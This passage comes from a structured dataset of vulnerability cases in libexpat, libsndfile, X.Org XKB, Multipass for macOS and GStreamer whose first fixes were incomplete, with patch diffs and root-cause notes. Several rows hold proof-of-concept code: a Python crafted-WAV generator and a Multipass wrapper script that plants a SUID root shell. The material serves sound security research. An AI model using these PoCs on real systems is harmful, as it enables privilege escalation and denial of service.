(i.e., all versions including 2.8.1, which has PR #1246 but not PR #1267)","CVE-2026-56131: netliomax25-code (GitHub contributor, PR #1267 author). Reviewed/confirmed by libexpat maintainer(s) in PR discussion.","NVD/MITRE: ""libexpat before 2.8.2 lacks handler call depth tracking for calls to XML_ResumeParser from within handlers in cases of a policy violation. Thus, a use-after-free can occur (similar to the CVE-2026-50219 situation)."" libexpat Changes file: ""CVE-2026-56131 -- Protect XML_ResumeParser from being called from a handler, plugging a hole in the fix to CVE-2026-50219.""","INCOMPLETE FIX (per user definition) -- a SECOND, independent incomplete-fix bypass of the same PR #1246, sibling to CASE-03 (CVE-2026-56412 / doCdataSection gap). This row was added after review because the source report only listed CVE-2026-56131/PR #1267 as a bare source-list link (""XML_ResumeParser also missed by PR #1246 (separate incomplete fix)"") without elaborating on it in the body text of the report, so it was initially omitted from the structured data. Web search confirmed it is a real, distinct, published CVE.","https://github.com/libexpat/libexpat/pull/1267 ; https://github.com/libexpat/libexpat/pull/1246 ; https://github.com/libexpat/libexpat/blob/master/expat/Changes ; https://cve.threatint.eu/CVE/CVE-2026-56131 ; https://bitninja.com/blog/expat-xml-parser-vulnerability-protect-your-server/ ; https://tracker.debian.org/pkg/expat ; https://nvd.nist.gov/vuln/detail/CVE-2026-56131 (not independently fetched, constructed from CVE ID pattern used elsewhere in this dataset)","This row exists because the original source .odt report under-documented this lineage -- it only surfaced CVE-2026-56131/PR #1267 as one bare bullet in the Sources list for CASE-03 and never described the vulnerability, PoC, or fix in its own body text (unlike CVE-2026-56412, which got a full section). All technical detail in this row comes from supplemental web search (GitHub PR #1267, libexpat Changes file, ThreatIntel CVE mirror), NOT from the uploaded document. Confirms that at least one of the 10 original cases actually branches into TWO sibling incomplete-fix CVEs from the same parent fix, rather than a strict linear original->complete pair -- worth re-scanning the other 9 cases' cited-but-unexplored source links for similar under-reported siblings if completeness is critical."
"CASE-04","libsndfile — cross-platform C audio file library (embedded in Linux distros, Python soundfile/pysndfile, GStreamer, Audacity, etc.)","C","src/ima_adpcm.c","ima_reader_init(); ima_close()","CVE-2022-33065","CWE-190 (Integer Overflow or Wraparound) [batch of signed integer overflow bugs across src/au.c, src/mat4.c, src/ima_adpcm.c]","Not specified per-file in report (batch CVE)","UBSAN fuzzing (GitHub issue #833, May 2022) found multiple signed 32-bit integer overflow bugs. In ima_adpcm.c, AIFF path: psf->sf.frames = pima->samplesperblock * pima->blocks / pima->channels — int*int overflow when product > 2^31-1.","// src/ima_adpcm.c -- BEFORE CVE-2022-33065 patch, AIFF path (line 241, original numbering):
psf->sf.frames = pima->samplesperblock * pima->blocks / pima->channels ;
// int x int -> int overflow when product > 2^31-1 (2,147,483,647)","9a829113c88a51e57c1e46473e90609e4b7df151","Referenced in report as commit 9a829113 to libsndfile master (exact host/org URL not given in source doc; libsndfile is hosted at github.com/libsndfile/libsndfile)","Sub-patch within a 17-sub-patch series authored by Alex Stewart, committed by evpobr, Oct 19, 2023","October 2023 (patched; Oct 19 2023 patch series opened)","Committed to master pre-1.2.2 line (backported by distros Nov 2023)","Author: Alex Stewart; Committer: evpobr","@@ -238,7 +238,7 @@ ima_reader_init (SF_PRIVATE *psf, int blockalign, int samplesperblock)
 case SF_FORMAT_AIFF :
   psf_log_printf (psf, ""still need to check block count\n"") ;
   pima->decode_block = aiff_ima_decode_block ;
-  psf->sf.frames = pima->samplesperblock * pima->blocks / pima->channels ;
+  psf->sf.frames = (sf_count_t) pima->samplesperblock * pima->blocks / pima->channels ;
   break ;
(2 other changes in same commit were whitespace-only, for a pre-commit hook; 3 additions/3 deletions total)","src/ima_adpcm.c, AIFF case arm, line 241 (original numbering); commit touches 3 lines total","""ima_adpcm: fix int overflow in ima_reader_init() -- When calculating sf.frames, pre-cast samplesperblock to sf_count_t, to provide the calculation with enough numeric space to avoid overflows."" (only applied to the AIFF switch-case arm)","CVE-2026-37555","CWE-190 (Integer Overflow or Wraparound)","CISA-ADP: 7.5 HIGH (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H); Reporter (Innora): 5.5 MEDIUM (AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H); SUSE also lists 8.2 CVSS4 / 7.5 CVSS3.1","The AIFF code path (line 241) was fixed with an (sf_count_t) cast during CVE-2022-33065, but the structurally identical WAV/W64 reader path (line 235) and the write-close path in ima_close() (line 167) were left uncast — same overflow exploitable via a crafted WAV/W64 file, corrupting psf->sf.frames with a negative or wrapped value. ""This issue was discovered after an incomplete fix for CVE-2022-33065."" (NVD/SUSE description).","CVE-2022-33065 fix was driven by UBSAN output that specifically flagged the AIFF branch (likely the path exercised by the fuzzer's test corpus). The developer fixed the flagged line without auditing the security invariant ('every samplesperblock x (blocks|blockcount) multiplication needs a widening cast') across all switch-case arms and all functions in the file. WAV/AIFF cases sit only 7 lines apart in the same switch block.","// Case 1 -- WAV/W64 path (line 235 in libsndfile 1.2.2), still vulnerable after CVE-2022-33065:
case SF_FORMAT_WAV :
case SF_FORMAT_W64 :
  psf->sf.frames = pima->samplesperblock * pima->blocks ;
  // int x int -- NO CAST -- STILL VULNERABLE

// Case 2 -- AIFF path (line 241), PATCHED by CVE-2022-33065:
case SF_FORMAT_AIFF :
  psf->sf.frames = (sf_count_t) pima->samplesperblock * pima->blocks / pima->channels ; // SAFE

// ima_close() at line 167 (write-close path), also still vulnerable:
psf->sf.frames = pima->samplesperblock * pima->blockcount / psf->sf.channels ;
// int x int -- NO CAST -- STILL VULNERABLE","Feng Ning, Innora Security Research (feng@innora.ai)","Identified/reported 2026-04-02; CVE reserved 2026-04-06; NVD published 2026-04-29","~2.5 years (Oct 2023 fix -> Apr 2026 report)","Report states 'Patch Commit 9a829113c88a51e57c1e46473e90609e4b7df151, Committed to master; no new release tag yet as of NVD publication' -- but this is the SAME hash as the original 2023 AIFF-only fix (see misc_notes). Supplemental research located distro backport commits: AlmaLinux df4cea1b204969463b508da067cf0855ab6f64d6 and 98125d62e45599e3f69c89a48ae93ff066c56850 (""apply patch for CVE-2026-37555"")","https://git.almalinux.org/rpms/libsndfile/commit/df4cea1b204969463b508da067cf0855ab6f64d6 ; https://git.almalinux.org/rpms/libsndfile/commit/98125d62e45599e3f69c89a48ae93ff066c56850","Required extension documented by reporter; distro packages (SUSE SUSE-SU-2026:1968-1 / 1969-1, bsc#1263695) shipped fixes May 18 2026","Patch required/documented by Apr 2026; distro security updates (SUSE) released 2026-05-18","Fix required for libsndfile <= 1.2.2 (post-1.2.2 patched builds via distro backports; no confirmed new upstream libsndfile release version found)","// Line 235 -- WAV/W64 reader path (ima_reader_init):
- psf->sf.frames = pima->samplesperblock * pima->blocks ;
+ psf->sf.frames = (sf_count_t) pima->samplesperblock * pima->blocks ;

// Line 167 -- write-close path (ima_close):
- psf->sf.frames = pima->samplesperblock * pima->blockcount / psf->sf.channels ;
+ psf->sf.frames = (sf_count_t) pima->samplesperblock * pima->blockcount / psf->sf.channels ;
// Both identical in structure to the working CVE-2022-33065 AIFF patch: pre-cast the first operand to sf_count_t before the int x int product is computed.","src/ima_adpcm.c, line 235 (ima_reader_init, WAV/W64 case) and line 167 (ima_close, write-close path)","Extend the (sf_count_t) pre-cast pattern already used for the AIFF path to the WAV/W64 reader path and the ima_close() write-finalization path — no other changes required.","Point-fix without invariant audit; UBSAN/fuzzer coverage gap (corpus exercised AIFF branch only); no regression test for the vulnerability class across all format types; minimal-diff mentality (fix touched exactly 1 security-relevant line)","Yes — Python 3 PoC script in Innora advisory","import struct
def make_wav_ima(samplesperblock, blocks):
    channels = 1
    blockalign = (samplesperblock - 1) // 2 + 4
    fmt = struct.pack('<HHIIHHHH', 0x0011, channels, 8000, 8000*blockalign, blockalign, 4, 2, samplesperblock)
    data_size = blockalign * blocks
    wav = (b'RIFF' + struct.pack('<I', 36+len(fmt)+8+data_size) + b'WAVEfmt ' + struct.pack('<I', len(fmt)) + fmt + b'data' + struct.pack('<I', data_size) + b'\x00'*data_size)
    return wav
with open('overflow.wav','wb') as f:
    f.write(make_wav_ima(50000, 50000))
# Trigger: sndfile-info overflow.wav
#          python3 -c ""import soundfile; soundfile.info('overflow.wav')""

Exact arithmetic: samplesperblock=50000 (0xC350), blocks=50000 (0xC350); int product = 50000*50000 = 2,500,000,000 (exceeds INT_MAX 2,147,483,647) -> wraps to -1,794,967,296 (UB in C); psf->sf.frames = (sf_count_t)(-1,794,967,296).","Open a crafted WAV/W64 file (or trigger via ima_close on write-finalize) with samplesperblock and blocks header fields chosen so their product overflows int32; resulting negative/garbage frame count can cause: (a) malloc() size_t wrap -> allocation failure/OOM kill; (b) for(i=0;i<frames;i++) loop terminating immediately -> silent data loss; (c) in some callers, use without sign-check -> heap buffer overflow.","libsndfile <= 1.2.2 (latest release at time of report)","CVE-2022-33065: reported via GitHub issue #833 (UBSAN fuzzing, May 2022), patched by Alex Stewart/evpobr. CVE-2026-37555: Feng Ning, Innora Security Research.","SUSE CVE page: ""This issue was discovered after an incomplete fix for CVE-2022-33065.""","INCOMPLETE FIX (per user definition).","https://nvd.nist.gov/vuln/detail/CVE-2026-37555 ; https://nvd.nist.gov/vuln/detail/CVE-2022-33065 ; https://gist.github.com/sgInnora/a5f5c19e4bf6f4fb74fab7b0ef2bfcc1 ; https://www.suse.com/security/cve/CVE-2026-37555.html ; https://www.suse.com/support/update/announcement/2026/suse-su-20261969-1/ ; https://lists.suse.com/pipermail/sle-updates/2026-May/046556.html ; https://git.almalinux.org/rpms/libsndfile/commit/df4cea1b204969463b508da067cf0855ab6f64d6 ; https://git.almalinux.org/rpms/libsndfile/commit/98125d62e45599e3f69c89a48ae93ff066c56850 ; https://github.com/libsndfile/libsndfile/blob/master/src/ima_adpcm.c","Source report is internally inconsistent/ambiguous about the 'complete fix' commit for CVE-2026-37555: its Vulnerability Metadata table lists 'Patch Commit 9a829113c88a51e57c1e46473e90609e4b7df151 / Patch Status: Committed to master; no new release tag yet' -- but 9a829113 is explicitly, elsewhere in the SAME report, identified as the October 2023 commit that fixed ONLY the AIFF path (the original, incomplete fix). No section of the report shows a distinct new commit hash actually applying the WAV/W64 + ima_close cast. This looks like an authoring error/placeholder in the source document rather than a real second commit. Supplemental web search located likely real downstream fix commits (AlmaLinux df4cea1b / 98125d62) which are provided here as the best available evidence of an actual applied patch, but these could not be independently confirmed against an upstream libsndfile commit in the time available. This discrepancy should be verified against the live libsndfile git history before being treated as authoritative. This report also lacked its own 'Sources' section (unlike other cases in the file); all listed source URLs for this case were obtained via supplemental web search."
"CASE-05","X.Org X Server (xserver) and Xwayland — XKB (X Keyboard Extension)","C","xkb/xkbtypes.c ; xkb/xkb.c","XkbChangeTypesOfKey(); CheckKeyTypes(); _XkbResizeKeySyms(); _XkbResizeKeyActions()","CVE-2025-26597","Buffer overflow (stack), reported as HIGH severity","Not separately given for original CVE in report (re-fix CVSS 7.8 HIGH given for combined event)","XkbChangeTypesOfKey() in xkb/xkbtypes.c: if called with nGroups==0, resized the key_sym_map table to 0 but left key_acts (key actions) unchanged/unresized. A subsequent call with nGroups>0 then overflowed because key_acts was still sized for the old (larger or mismatched) nGroups value. key_sym_map and key_acts are both sized XkbMaxShiftLevel * XkbNumKbdGroups and must be resized together or they fall out of sync.","if (nGroups == 0) {
  _XkbResizeKeySyms(xkb, key, 0);    /* resizes key_sym_map to 0 */
  /* BUG: key_acts NOT resized here -- left at old size */
  return Success;
}
/* Later call with nGroups > 0: */
/* key_acts still sized for old nGroups -> write past end of array */
_XkbResizeKeyActions(xkb, key, nGroups);  /* overflow */","Not given in report (only re-fix commit hash 543e108... is provided)","Not given in report","xorg-server < 21.1.16 fix","February 2025","xorg-server 21.1.16 / Xwayland 24.1.x","Not specified","if (nGroups == 0) {
    _XkbResizeKeySyms(xkb, key, 0);
+   _XkbResizeKeyActions(xkb, key, 0);  /* ADDED: resize both together */
    return Success;
}","xkb/xkbtypes.c, XkbChangeTypesOfKey(), nGroups==0 branch","Adds resizing of key_acts alongside key_sym_map when nGroups==0, so both arrays stay in sync for the demonstrated overflow condition.","CVE-2026-50258","Stack buffer overflow (three separate stack buffers)","7.8 HIGH (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)","Stack overflow via CheckKeyTypes() in xkb/xkb.c processing excessive shift levels. The nGroups==0 fix in XkbChangeTypesOfKey() addressed the demonstrated case, but the upstream validator CheckKeyTypes() (which processes client-supplied key type requests BEFORE they reach XkbChangeTypesOfKey()) never validated that client-supplied numLevels values stayed within XkbMaxShiftLevel — allowing three separate stack buffer overflows in the same function.","The 2025 fix was function-scoped to XkbChangeTypesOfKey() where the overflow was demonstrated; it did not audit the caller chain. CheckKeyTypes() is called upstream to validate/normalise client requests and contains the SAME overflow primitive (client-controlled size used as index into fixed-size stack buffers) but was never bounds-checked. A client sends an XKB SetMap request with a key type whose numLevels exceeds XkbMaxShiftLevel; CheckKeyTypes() accepts it without clamping and uses it as an index into three fixed-size stack arrays.","static int CheckKeyTypes(ClientPtr client, XkbDescPtr xkb, xkbSetMapReq *req, xkbKeyTypeWireDesc **wireRtrn) {
  KeySym    newSyms[XkbMaxShiftLevel * XkbNumKbdGroups];  /* stack */
  XkbAction newActs[XkbMaxShiftLevel * XkbNumKbdGroups];  /* stack */
  XkbModsRec preserve[XkbMaxShiftLevel * XkbNumKbdGroups]; /* stack */
  for (i = 0; i < req->nTypes; i++) {
    wire = *wireRtrn;
    /* BUG: wire->numLevels is client-controlled, never clamped */
    for (j = 0; j < wire->numLevels; j++) {
      newSyms[j] = ...;    /* OVERFLOW if j >= XkbMaxShiftLevel */
      newActs[j] = ...;    /* OVERFLOW */
      preserve[j] = ...;   /* OVERFLOW -- THREE separate overflows */
    }
  }
}","Anonymous, working with TrendAI Zero Day Initiative (ZDI-CAN-30160)","Disclosed via X.Org Security Advisory, June 2026 (oss-security thread 2026-06-02)","~16 months (Feb 2025 fix -> Jun 2026 disclosure)","543e108516428fc8c3bea91d6563ad266f9a801e","https://gitlab.freedesktop.org/xorg/xserver/-/commit/543e108516428fc8c3bea91d6563ad266f9a801e","Commit 543e108, part of the June 2026 X.Org security advisory (also fixes sibling CVE-2026-50259, a separate mapWidths[256] overflow in _XkbSetMapChecks() from the same root commit)","June 5, 2026","xorg-server 21.1.23 / Xwayland 24.1.12","+ /* Re-fix: clamp numLevels to XkbMaxShiftLevel before any writes */
+ if (wire->numLevels > XkbMaxShiftLevel)
+     wire->numLevels = XkbMaxShiftLevel;
  for (j = 0; j < wire->numLevels; j++) {
    newSyms[j] = ...;    /* safe: j < XkbMaxShiftLevel guaranteed */
    newActs[j] = ...;    /* safe */
    preserve[j] = ...;   /* safe */
  }","xkb/xkb.c, CheckKeyTypes(), before the numLevels-indexed write loop","Clamps client-supplied wire->numLevels to XkbMaxShiftLevel before it is used as an index into the three stack buffers (newSyms, newActs, preserve). Distro patches shipped via Red Hat RHSA-2026:26562 through RHSA-2026:29844 (RHEL 8, 9, 10).","Fix scoped to the function where the crash was demonstrated rather than tracing all callers/paths that share the same missing-bounds-validation invariant; audit stopped at the crash site instead of the upstream validator","Not an explicit standalone PoC script in report; advisory states a client can change key types to excessive shift levels to trigger the three overflows","XKB SetMap request with a key type whose numLevels field is set larger than XkbMaxShiftLevel, sent by any connected X client to CheckKeyTypes().","A local or otherwise-connected X client sends a crafted XKB SetMap request with an oversized numLevels value; CheckKeyTypes() writes past three stack buffers (newSyms, newActs, preserve) before any bounds check, enabling local privilege escalation / memory corruption in the X server process (CVSS AV:L, PR:L).","All xorg-server / Xwayland versions carrying the CVE-2025-26597 fix but not commit 543e108 (i.e., xorg-server < 21.1.23 / Xwayland < 24.1.12)","CVE-2025-26597: Jan-Niklas Sohn (Trend Micro Zero Day Initiative). CVE-2026-50258: Anonymous researcher w/ TrendAI Zero Day Initiative (ZDI-CAN-30160).","""This is caused by an incomplete fix of CVE-2025-26597"" (NVD signal phrase per report)","Source document itself labels this case's category as ""Reintro type"" / ""Incomplete Fix Reintroduction"" in its own header table, BUT per the user's task definitions (reintroduction = a fix's security logic later weakened/removed; this case is instead a fix that was too narrow in scope from the start and never covered the sibling path) this case matches INCOMPLETE FIX, not reintroduction — no prior protection was removed/weakened by a later commit; CheckKeyTypes() was simply never protected in the first place. Retained document's own label in this field for transparency but the user's classification framework should treat this as an incomplete fix.","https://nvd.nist.gov/vuln/detail/CVE-2026-50258 ; https://nvd.nist.gov/vuln/detail/CVE-2025-26597 ; https://lists.x.org/archives/xorg-announce/2026-June/003702.html ; https://gitlab.freedesktop.org/xorg/xserver/-/commit/543e108516428fc8c3bea91d6563ad266f9a801e ; https://www.openwall.com/lists/oss-security/2026/06/02/1 ; https://access.redhat.com/security/cve/CVE-2026-50258 ; http://ftp.pkgsrc.org/pub/NetBSD/NetBSD-current/xsrc/external/mit/xorg-server/dist/ChangeLog","Original-fix commit hash for CVE-2025-26597 (Feb 2025, xorg-server 21.1.16) was NOT given anywhere in the source report and could not be located/verified within the scope of this extraction; flagged as a genuine gap rather than fabricated."
"CASE-06","Canonical Multipass (macOS) — VM management tool, root LaunchDaemon","Shell/installer scripting (pkg post-install), plist configuration (not a C source-code CWE case)","macOS pkg post-install script; /Library/Application Support/com.canonical.multipass/bin/ ; com.canonical.multipassd.plist","N/A (binary permission / PATH resolution issue, not a function-level bug)","CVE-2025-5199","CWE-276 (Incorrect Default Permissions)","7.8 HIGH (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) -- Canonical CNA (rating applies to combined event per report header; original advisory GHSA-2j82-p5cq-62p3)","During Multipass installation on macOS <=1.15.1, ALL binaries in /Library/Application Support/com.canonical.multipass/bin/ (multipassd, multipass, qemu-img, qemu-system-aarch64, qemu-system-x86_64, sshfs_server) were installed owned by the installing (non-root) user rather than root. Any local user who installed Multipass could overwrite multipassd; since it runs as a root LaunchDaemon at boot, this yields root code execution on next restart.","# CVE-2025-5199 -- permissions BEFORE fix (Multipass <=1.15.1)
$ ls -la '/Library/Application Support/com.canonical.multipass/bin/'
-rwxr-xr-x 1 installinguser admin multipassd          <- WRITABLE by installer
-rwxr-xr-x 1 installinguser admin multipass           <- WRITABLE
-rwxr-xr-x 1 installinguser admin qemu-img            <- WRITABLE
-rwxr-xr-x 1 installinguser admin qemu-system-aarch64  <- WRITABLE
-rwxr-xr-x 1 installinguser admin qemu-system-x86_64   <- WRITABLE
-rwxr-xr-x 1 installinguser admin sshfs_server         <- WRITABLE

# PoC (GHSA-2j82-p5cq-62p3):
cp /usr/bin/evil_script '/Library/Application Support/com.canonical.multipass/bin/multipassd'
$ sudo reboot
# after reboot, LaunchDaemon runs payload as root","Not given (closed-source/installer-script fix; no public commit hash provided in report)","Not given","Installer post-install script change","July 2025","1.16.0","Not specified","# Multipass 1.16.0 -- post-install script excerpt (fix for CVE-2025-5199):
chown root:wheel '/Library/Application Support/com.canonical.multipass/bin/multipassd'
# Result: multipassd becomes root:wheel; all 5 auxiliary binaries remain installinguser:admin","macOS pkg post-install script (path not further specified in report)","chown root:wheel applied to the multipassd binary only.","CVE-2026-49237","CWE-276 (Incorrect Default Permissions)","7.8 HIGH (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) -- Canonical CNA","Same privilege escalation via five auxiliary binaries (qemu-img, qemu-system-aarch64, qemu-system-x86_64, sshfs_server, multipass) left user-writable in the same directory. multipassd's LaunchDaemon PATH prioritises the user-writable bin/ directory; multipassd invokes these auxiliaries by bare name, so PATH resolution picks up the attacker-controlled directory first.","The 2025 fix was binary-scoped: it secured only the one binary directly targeted by the original PoC (multipassd). The root cause -- a user-writable directory placed first in a root daemon's PATH -- applied equally to every binary in that directory. multipassd invokes qemu-img/qemu-system-*/sshfs_server/multipass by bare name (not full path), so PATH resolution order determines which file actually executes; any writable file among the five auxiliaries is an equivalent attack surface, but only the directly-named target of the original exploit was fixed.","<!-- com.canonical.multipassd.plist -->
<key>EnvironmentVariables</key>
<dict>
  <key>PATH</key>
  <!-- User-writable directory FIRST in PATH: -->
  <string>/Library/Application Support/com.canonical.multipass/bin:/usr/bin:/bin</string>
</dict>
<key>ProgramArguments</key>
<array>
  <string>/Library/Application Support/com.canonical.multipass/bin/multipassd</string>
  <!-- multipassd then calls qemu-img, qemu-system-*, sshfs_server by bare name -> resolved via PATH above -> user-writable dir -->
</array>

# PoC (CVE-2026-49237):
cat > '/Library/Application Support/com.canonical.multipass/bin/qemu-img' << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash      # SUID root shell
exec /usr/bin/qemu-img ""$@"" # forward to real binary (stay stealthy)
EOF
chmod +x '.../bin/qemu-img'
multipass launch              # daemon creates VM -> calls qemu-img as root
/tmp/rootbash -p              # privilege escalation complete","Not individually named in report (credited to GHSA-r2xg-x32f-23c5 advisory)","2026 (advisory GHSA-r2xg-x32f-23c5; exact date not given in report)","Not precisely dated in report (v1.16.0 Jul 2025 -> v1.16.3 re-fix '2026')","Not given (closed-source/installer-script fix; no public commit hash provided in report)","Not given","Installer post-install script change, v1.16.3","2026 (exact date not specified beyond version)","1.16.3","# Multipass 1.16.3 -- post-install script (re-fix for CVE-2026-49237)
BINDIR='/Library/Application Support/com.canonical.multipass/bin'
chown root:wheel ""$BINDIR/multipassd""
chown root:wheel ""$BINDIR/multipass""
chown root:wheel ""$BINDIR/qemu-img""
chown root:wheel ""$BINDIR/qemu-system-aarch64""
chown root:wheel ""$BINDIR/qemu-system-x86_64""
chown root:wheel ""$BINDIR/sshfs_server""","macOS pkg post-install script (path not further specified)","Extends ownership correction (chown root:wheel) to all six binaries in bin/, not just multipassd.","Fix audited/secured only the one binary directly demonstrated in the PoC (multipassd) rather than the entire trust chain reachable from the root daemon's execution context (PATH + every bare-name-invoked auxiliary)","Yes, both original and incomplete-fix PoCs given in report (see snippet columns)","See vulnerable_code_snippet_after_original_fix and original_vulnerable_code_snippet columns.","Any local user who installed Multipass (or has write access to the bin/ directory) replaces one of the five still-user-writable auxiliary binaries with a malicious wrapper; when multipassd (running as root via LaunchDaemon) next invokes that tool by bare name during normal operation (e.g. `multipass launch`), the wrapper executes as root, e.g. minting a SUID root shell.","v1.16.0-1.16.2 (all platforms with the CVE-2025-5199 fix but not the CVE-2026-49237 re-fix)","CVE-2025-5199: isaacatmann (GHSA-2j82-p5cq-62p3). CVE-2026-49237: credited to GHSA-r2xg-x32f-23c5 advisory (specific researcher not named in report).","""due to an incomplete fix for CVE-2025-5199"" (NVD signal phrase per report)","Source document itself labels this case ""Reintro type"" / ""Incomplete Fix Reintroduction"" in its own header table, but per the user's task definitions this is an INCOMPLETE FIX, not a reintroduction -- the 2025 fix was simply too narrow in scope (one binary) and no prior protection was later removed/weakened.","https://nvd.nist.gov/vuln/detail/CVE-2026-49237 ; https://nvd.nist.gov/vuln/detail/CVE-2025-5199 ; https://github.com/canonical/multipass/security/advisories/GHSA-2j82-p5cq-62p3 ; https://github.com/canonical/multipass/security/advisories/GHSA-r2xg-x32f-23c5 ; https://github.com/canonical/multipass","No commit hashes were available anywhere in the source report for either the original or the re-fix in this case (Multipass installer changes are not necessarily tracked as discrete public commits in the same way as the other cases); this gap is noted rather than fabricated. This is the only case in the set that is not a C source-code memory-safety bug -- it is a permissions/installer misconfiguration (CWE-276)."
"CASE-07","GStreamer gst-plugins-good — WAV demuxer (used by GNOME Videos/Totem, PipeWire, Firefox-on-Linux media backend, embedded/IoT Linux, streaming servers)","C","gst/wavparse/gstwavparse.c","gst_wavparse_adtl_chunk(); gst_wavparse_stream_headers()","CVE-2024-47778 (GHSL-2024-258)","CWE-125 (Out-of-Bounds Read)","Not separately given (see incomplete-fix CVE for CVSS of the class)","Two root causes in the adtl (associated data list) LIST-chunk sub-chunk walker: (1) integer underflow in gst_wavparse_stream_headers() -- 'const gint data_size = size - 4' can go negative if size<4 (gint is signed 32-bit), appearing huge when cast to guint32; (2) unvalidated size -- the adtl chunk's 'size' field is read directly from the file (GST_READ_UINT32_LE) with no check against the actual remaining buffer, so size=0xFFFFFFFF passes no validation and the while-loop marches through all of process memory.","static gboolean gst_wavparse_adtl_chunk (GstWavParse * wav, const guint8 * data, guint32 size) {
  guint32 ltag, lsize, offset = 0;
  while (size >= 8) {
    ltag  = GST_READ_UINT32_LE (data + offset);
    lsize = GST_READ_UINT32_LE (data + offset + 4);
    /* NO CHECK: is lsize <= size - 8 ? */
    switch (ltag) {
      case GST_RIFF_TAG_labl: gst_wavparse_labl_chunk (wav, data+offset+8, lsize); break;
      case GST_RIFF_TAG_note: gst_wavparse_note_chunk (wav, data+offset+8, lsize); break;
    }
    offset += 8 + GST_ROUND_UP_2 (lsize);
    size   -= 8 + GST_ROUND_UP_2 (lsize);
  }
}
/* crafted lsize=0xFFFFFFF8 -> offset += 8+0xFFFFFFF8 wraps to 0 on 32-bit guint32 arithmetic; loop condition may stay true indefinitely */","13b48016b3ef1e822c393c2871b0a561ce19ecb3","https://gitlab.freedesktop.org/gstreamer/gstreamer/-/commit/13b48016b3ef1e822c393c2871b0a561ce19ecb3","Merge request !8042 (one of ~46 patches in this MR, part of a larger batch GHSL-2024-245 through GHSL-2024-268 covering 14+ files)","2024-12-03","GStreamer 1.24.10","Not individually named (GStreamer security team)","--- gst/wavparse/gstwavparse.c (before fix)
+++ gst/wavparse/gstwavparse.c (after commit 13b48016)
@@ -924,6 +924,9 @@ gst_wavparse_adtl_chunk (GstWavParse * wav, ...)
   while (size >= 8) {
     ltag  = GST_READ_UINT32_LE (data + offset);
     lsize = GST_READ_UINT32_LE (data + offset + 4);
+    if (lsize + 8 > size)        /* NEW: stop if sub-chunk exceeds buffer */
+      break;
     switch (ltag) { ... }
     offset += 8 + GST_ROUND_UP_2 (lsize);  /* uses ROUNDED value */
     size   -= 8 + GST_ROUND_UP_2 (lsize);  /* uses ROUNDED value */
  }","gst/wavparse/gstwavparse.c, gst_wavparse_adtl_chunk(), inside while(size>=8) loop, ~line 924","""wavparse: add bounds check in adtl chunk parsing"" -- adds `if (lsize + 8 > size) break;` guard before consuming each sub-chunk. Correct for EVEN lsize values, where GST_ROUND_UP_2(lsize)==lsize so the guard matches the actual stride.","CVE-2026-1940","CWE-125 (Out-of-Bounds Read)","NIST: 7.5 HIGH (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H); CNA/Red Hat: 5.1 MEDIUM (AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L)","The CVE-2024-47778 guard `if (lsize + 8 > size) break;` validates the RAW lsize, but the loop's actual advance/shrink uses the RIFF-rounded value: `offset += 8 + GST_ROUND_UP_2(lsize)`. GST_ROUND_UP_2 rounds odd lsize UP by 1 byte for word alignment. When lsize is odd and (lsize+8)==size exactly, the guard passes (15 is not > 15) but the actual advance is 1 byte larger than validated, causing size to underflow (guint32 wrap to 0xFFFFFFFF) and the loop to continue reading past the buffer end.","Mismatched guard and stride expressions: guard checks `lsize + 8`; stride uses `8 + GST_ROUND_UP_2(lsize)`. These are equal only when lsize is even. The RIFF word-alignment semantics of GST_ROUND_UP_2 were not reflected in the guard, and no regression test exercised odd-valued lsize.","#define GST_ROUND_UP_2(num)  (((num)+1)&~1)   /* rounds num UP to nearest even integer */
/* GST_ROUND_UP_2(7) = 8 (adds 1); GST_ROUND_UP_2(8) = 8 (no change) */

/* Example bypass: lsize = 7, size = 15 */
/* Guard check:  lsize + 8 = 15,  15 > 15 -> FALSE -> loop continues (boundary case) */
/* Actual advance:  8 + GST_ROUND_UP_2(7) = 8 + 8 = 16 */
/*   offset += 16  -> reads 16 bytes but only 15 remain */
/*   size   -= 16  -> size wraps: 15 - 16 = 0xFFFFFFFF (guint32 underflow) */
/*   Loop condition: 0xFFFFFFFF >= 8 -> TRUE -> continues, OOB read on next GST_READ_UINT32_LE */

/* General bypass recipe: LIST:adtl total size = N; sub-chunk lsize = N-9 (odd, so lsize+8 = N-1); */
/* guard: (N-9)+8 = N-1, is N-1 > N? No -> continues; advance: 8+GST_ROUND_UP_2(N-9) = 8+(N-8) = N -> size underflows to 0xFFFFFFFF */","Red Hat, Inc. (CNA, CVE-2026-1940); an unnamed researcher auditing the CVE-2024-47778 patch noticed the GST_ROUND_UP_2 discrepancy (Mar 2026, GitLab issue #4854)","March 2026 (issue #4854 filed); CVE reserved/published 2026-03-23 (Red Hat Bugzilla #2436932)","~15 months (Dec 2024 fix -> Mar 2026 discovery)","Not given as a specific hash in report (fix landed in GStreamer 1.28.1 per GStreamer Security Advisory SA-2026-0001)","https://gstreamer.freedesktop.org/security/sa-2026-0001.html ; https://gitlab.freedesktop.org/gstreamer/gstreamer/-/issues/4854","GStreamer Security Advisory SA-2026-0001","By 2026-06-17 (advisory publication referencing the fix); NIST initial CVSS analysis 2026-05-04","GStreamer 1.28.1","--- gst/wavparse/gstwavparse.c (CVE-2024-47778 patch -- INCOMPLETE)
+++ gst/wavparse/gstwavparse.c (CVE-2026-1940 complete fix)
  while (size >= 8) {
    ltag  = GST_READ_UINT32_LE (data + offset);
    lsize = GST_READ_UINT32_LE (data + offset + 4);
-   if (lsize + 8 > size)          /* misses odd-lsize case */
-     break;
+   if (8 + GST_ROUND_UP_2 (lsize) > size)  /* accounts for RIFF padding */
+     break;
    switch (ltag) { ... }
    offset += 8 + GST_ROUND_UP_2 (lsize);
    size   -= 8 + GST_ROUND_UP_2 (lsize);
  }
/* Alternative, more robust form suggested in report (absolute bound + overflow guard): */
+ guint32 advance = 8 + GST_ROUND_UP_2 (lsize);
+ if (advance > size || advance < 8)  /* also guards against overflow */
+   break;
+ offset += advance;
